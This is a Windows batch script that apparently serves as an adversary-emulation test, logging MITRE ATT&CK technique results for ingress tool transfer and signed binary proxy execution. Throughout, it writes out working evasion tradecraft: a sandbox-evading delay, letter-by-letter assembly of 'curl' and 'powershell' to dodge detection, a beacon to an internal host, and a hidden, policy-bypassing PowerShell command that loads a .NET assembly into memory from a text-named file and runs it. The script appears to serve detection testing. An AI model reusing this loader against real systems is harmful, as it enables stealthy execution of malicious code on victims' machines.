@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET mqijhf=%APPDATA%\7883\5b890063
SET ecpthje=https://10.0.0.49
SET obcvrb=https://10.0.0.49/stage/2/icon.png?7883-10
SET otctrk=ITZEL-S2BO
SET vjrnsl=10
SET ggipcyk=project.txt
SET dwqmpb=7883

REM Create log directory if it doesn't exist
SET zffvwj=%APPDATA%\!vjrnsl!\macula-simulations.log
mkdir "%APPDATA%\!vjrnsl!" 2>nul

REM Initial delay - evades sandbox timing analysis
echo [!DATE! !TIME!][DEBUG][!otctrk!]: initial_delay_start=timeout_40s>> "!zffvwj!" 2>nul
timeout /t 40 /nobreak >nul

REM Character-by-character assembly for curl
SET u1=c
SET u2=u
SET u3=r
SET u4=l
SET vrwc=%u1%%u2%%u3%%u4%

REM Character-by-character assembly for powershell parts
SET a1=p
SET a2=o
SET a3=w
SET a4=e
SET a5=r
SET a6=s
SET a7=h
SET a8=e
SET a9=l
SET a10=l
SET fgttx=%a1%%a2%%a3%%a4%%a5%%a6%%a7%%a8%%a9%%a10%

REM Heartbeat check using encoded curl command
echo [!DATE! !TIME!][DEBUG][!otctrk!]: heartbeat_check_start=!obcvrb!>> "!zffvwj!" 2>nul
%vrwc% -k -s -o nul "!obcvrb!"
SET gqwepl=%ERRORLEVEL%
IF !gqwepl! EQU 0 (
    SET res1=1
    SET err1=
) ELSE (
    SET res1=0
    SET err1=connection_failed
)

REM TTP Logging for heartbeat - locale-independent datetime using wmic
FOR /F "usebackq tokens=2 delims==." %%i IN (`wmic os get localdatetime /VALUE 2^>nul`) DO SET datetime=%%i
SET _year=!datetime:~0,4!
SET _month=!datetime:~4,2!
SET _day=!datetime:~6,2!
SET _hour=!datetime:~8,2!
SET _min=!datetime:~10,2!
SET _sec=!datetime:~12,2!
SET ttp_ts=!_year!-!_month!-!_day! !_hour!:!_min!:!_sec!.000
>> "!zffvwj!" 2>nul echo [!ttp_ts!][!otctrk!]: !vjrnsl!-!dwqmpb!-T1105|Ingress Tool Transfer=!res1!:!err1!

echo [!DATE! !TIME!][DEBUG][!otctrk!]: heartbeat_check_complete=result_!res1!>> "!zffvwj!" 2>nul

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!otctrk!]: interop_delay_start=ping_8>> "!zffvwj!" 2>nul
ping -n 8 127.0.0.1 >nul

REM Change directory
echo [!DATE! !TIME!][DEBUG][!otctrk!]: chdir_start=!mqijhf!>> "!zffvwj!" 2>nul
cd /d "!mqijhf!"
SET qxliha=%ERRORLEVEL%
IF !qxliha! NEQ 0 (
    SET err2=directory_not_found
) ELSE (
    SET err2=
)
echo [!DATE! !TIME!][DEBUG][!otctrk!]: chdir_complete=result_!qxliha!>> "!zffvwj!" 2>nul

REM Random delay 10-30 seconds
SET /A xoknpt=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!otctrk!]: random_delay_start=!xoknpt!s>> "!zffvwj!" 2>nul
timeout /t !xoknpt! /nobreak >nul

REM Build PowerShell command with string substitution encoding (escaped exclamation marks)
SET tmp_cmd=-nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!ggipcyk!')).EntryPoint.Invoke($null, @(,[string[]]@())) }"
SET t0=-
SET t1=n
SET t2=o
SET t3=p
SET t4= 
SET t5=-
SET t6=w
SET t7= 
SET t8=h
SET t9=i
SET t10=d
SET t11=d
SET t12=e
SET t13=n
SET t14= 
SET t15=-
SET t16=e
SET t17=p
SET t18= 
SET t19=b
SET t20=y
SET t21=p
SET t22=a
SET t23=s
SET t24=s
SET t25= 
SET t26=-
SET t27=C
SET t28=o
SET t29=m
SET t30=m
SET t31=a
SET t32=n
SET t33=d
SET t34= 
SET t35="
SET t36=&
SET t37= 
SET t38={
SET t39= 
SET t40=[
SET t41=R
SET t42=e
SET t43=f
SET t44=l
SET t45=e
SET t46=c
SET t47=t
SET t48=i
SET t49=o
SET t50=n
SET t51=.
SET t52=A
SET t53=s
SET t54=s
SET t55=e
SET t56=m
SET t57=b
SET t58=l
SET t59=y
SET t60=]
SET t61=:
SET t62=:
SET t63=L
SET t64=o
SET t65=a
SET t66=d
SET t67=(
SET t68=[
SET t69=I
SET t70=O
SET t71=.
SET t72=F
SET t73=i
SET t74=l
SET t75=e
SET t76=]
SET t77=:
SET t78=:
SET t79=R
SET t80=e
SET t81=a
SET t82=d
SET t83=A
SET t84=l
SET t85=l
SET t86=B
SET t87=y
SET t88=t
SET t89=e
SET t90=s
SET t91=(
SET t92='
SET t93=^^^!
SET t94=g
SET t95=g
SET t96=i
SET t97=p
SET t98=c
SET t99=y
SET t100=k
SET t101=^^^!
SET t102='
SET t103=)
SET t104=)
SET t105=.
SET t106=E
SET t107=n
SET t108=t
SET t109=r
SET t110=y
SET t111=P
SET t112=o
SET t113=i
SET t114=n
SET t115=t
SET t116=.
SET t117=I
SET t118=n
SET t119=v
SET t120=o
SET t121=k
SET t122=e
SET t123=(
SET t124=$
SET t125=n
SET t126=u
SET t127=l
SET t128=l
SET t129=,
SET t130= 
SET t131=@
SET t132=(
SET t133=,
SET t134=[
SET t135=s
SET t136=t
SET t137=r
SET t138=i
SET t139=n
SET t140=g
SET t141=[
SET t142=]
SET t143=]
SET t144=@
SET t145=(
SET t146=)
SET t147=)
SET t148=)
SET t149= 
SET t150=}
SET t151="

REM Assemble encoded command
SET cmd_part=
FOR /L %%i IN (0,1,151) DO (
    SET var_name=t%%i
    CALL SET cmd_part=%%cmd_part%%%%!var_name!%%
)

REM Check if PowerShell file exists before execution
IF NOT EXIST "!ggipcyk!" (
    SET ps_result=9009
    SET res2=0
    SET err3=file_not_found
) ELSE (
    REM Execute .NET DLL via PowerShell
    echo [!DATE! !TIME!][DEBUG][!otctrk!]: assembly_load_start=!ggipcyk!>> "!zffvwj!" 2>nul
    IF EXIST "%WINDIR%\Sysnative\WindowsPowerShell\v1.0\!fgttx!.exe" (
        "%WINDIR%\Sysnative\WindowsPowerShell\v1.0\!fgttx!.exe" !cmd_part!
    ) ELSE (
        "%WINDIR%\System32\WindowsPowerShell\v1.0\!fgttx!.exe" !cmd_part!
    )
    SET ps_result=%ERRORLEVEL%
)

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!otctrk!]: final_delay_start=choice_10>> "!zffvwj!" 2>nul
CHOICE /C Y /D Y /T 10 >nul

REM TTP Logging for T1218
IF !ps_result! EQU 0 (
    SET res2=1
    SET err3=
) ELSE IF !ps_result! NEQ 9009 (
    SET res2=0
    SET err3=assembly_load_failed
)

FOR /F "usebackq tokens=2 delims==." %%i IN (`wmic os get localdatetime /VALUE 2^>nul`) DO SET datetime2=%%i
SET _year2=!datetime2:~0,4!
SET _month2=!datetime2:~4,2!
SET _day2=!datetime2:~6,2!
SET _hour2=!datetime2:~8,2!
SET _min2=!datetime2:~10,2!
SET _sec2=!datetime2:~12,2!
SET ttp_ts2=!_year2!-!_month2!-!_day2! !_hour2!:!_min2!:!_sec2!.000
>> "!zffvwj!" 2>nul echo [!ttp_ts2!][!otctrk!]: !vjrnsl!-!dwqmpb!-T1218|Signed Binary Proxy Execution=!res2!:!err3!

echo [!DATE! !TIME!][DEBUG][!otctrk!]: simulation_complete=exitcode_!ps_result!>> "!zffvwj!" 2>nul

ENDLOCAL
exit /b 0